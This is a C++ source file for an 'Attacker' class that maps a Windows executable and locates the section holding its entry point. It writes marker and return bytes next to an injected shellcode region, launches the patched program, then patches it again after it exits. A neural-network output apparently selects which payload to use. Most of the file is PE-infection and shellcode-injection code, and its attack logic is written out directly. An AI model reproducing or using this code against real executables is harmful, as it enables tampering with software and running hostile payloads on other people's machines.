#include "Attacker.h"


Attacker::Attacker(std::filesystem::path p) : file_name(p) {};


void Attacker::set_target(std::filesystem::path p)
{
	file_name = p;
}


void Attacker::execute_payload()
{
	std::string f_n = file_name.u8string();
	LPCSTR lpApplicationName = f_n.c_str();
    
    while (PE::PE_file::is_file_running(file_name))
    {
        Sleep(5000);
    }
    PE::PE_file pe_file(file_name);
    

    pe_file.map_file();
    pe_file.parse_file();
    auto first_section_header = pe_file.get_first_header();
    auto original_entry_point = pe_file.get_oep();
    auto nt_header = pe_file.get_nt_header();

    PIMAGE_SECTION_HEADER current_section = first_section_header;
    PIMAGE_SECTION_HEADER next_section;
    
    auto file_map_view = pe_file.get_file_map_view();

    DWORD index = 0;

    for (int i = 0; i < nt_header->FileHeader.NumberOfSections - 2; i++)
    {
        current_section = reinterpret_cast<PIMAGE_SECTION_HEADER>(first_section_header + i);
        next_section = reinterpret_cast<PIMAGE_SECTION_HEADER>(first_section_header + (i + 1));
        if (original_entry_point >= current_section->VirtualAddress && original_entry_point < next_section->VirtualAddress)
        {
            index = current_section->PointerToRawData;
            std::cout << "jop";
            break;
        }
    }

    auto aOEP = &original_entry_point;

    char jojo[] = "\x10\x10\x10\x10\x10\x10\x10\x10";

    //memcpy(&file_map_view[original_entry_point+index+shellcode_size_full], jojo, sizeof jojo);


    int val = 0;
    int counter = 0;
    int index_end = 0;

    for (int i = 0; i < (current_section->SizeOfRawData - shellcode_size_full); i++)
    {
        val = static_cast<int>(file_map_view[index + shellcode_size_full + i]);
        if (val == 17)
        {
            counter++;
        }
        else
        {
            counter = 0;
        }
        if (counter == 9)
        {
            index_end = i - 9;
            break;
        }
        //std::cout << val <<",";
        //std::cout << std::hex << (file_map_view[index + shellcode_size_full + i] << 24 | file_map_view[index + shellcode_size_full + i] << 16 | file_map_view[index + shellcode_size_full + i] << 8);
    }

    memcpy(&file_map_view[index + shellcode_size_full + index_end], &jojo, sizeof(jojo));

    pe_file.freeFile();

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));


    CreateProcessA(
        lpApplicationName,   // the path
        NULL,                // Command line
        NULL,                   // Process handle not inheritable
        NULL,                   // Thread handle not inheritable
        FALSE,                  // Set handle inheritance to FALSE
        CREATE_NEW_CONSOLE,     // Opens file in a separate console
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi           // Pointer to PROCESS_INFORMATION structure
    );
    // Close process and thread handles. 
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);


    while (PE::PE_file::is_file_running(file_name))
    {
        Sleep(5000);
    }
    

    PE::PE_file pe_process(file_name);
    pe_process.map_file();
    file_map_view = pe_process.get_file_map_view();

    memcpy(&file_map_view[index + shellcode_size_full + index_end], "\xc3", sizeof "\xc3");
    memcpy(&file_map_view[index + shellcode_size_full + index_end + sizeof "\xc3" - 1], "\x11\x11\x11\x11\x11\x11\x11\x11\x11", sizeof "\x11\x11\x11\x11\x11\x11\x11\x11\x11");

    pe_process.freeFile();
}


void Attacker::execute_exe()
{
    std::string f_n = file_name.u8string();
    LPCSTR lpApplicationName = f_n.c_str();

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));


    CreateProcessA(
        lpApplicationName,   
        NULL,                
        NULL,                   
        NULL,                   
        FALSE,                  
        CREATE_NEW_CONSOLE,     
        NULL,           
        NULL,           
        &si,            
        &pi           
    );
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}


void Attacker::process_nn_output(std::vector<double>& nn_output)
{
    for (int i = 0; i < nn_output.size(); i++)
    {
        if (nn_output[i] == 1)
        {
            payload_number = i;
        }
    }
}